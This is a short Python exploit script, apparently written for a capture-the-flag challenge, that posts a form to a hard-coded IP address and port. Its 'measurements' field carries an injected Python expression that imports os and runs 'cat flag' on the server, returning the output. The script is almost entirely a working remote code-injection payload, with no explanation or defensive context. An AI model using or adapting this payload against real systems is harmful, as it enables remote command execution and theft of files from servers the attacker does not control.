import requests


# r = requests.post(host,headers=headers,data=payload)




payload = {
    "ingredient" : "a",
    "measurements" : '__import__("os").popen("cat flag").read()'
}


host = "http://138.68.186.7:32420/"

r = requests.post(host,data=payload)

print(r.text)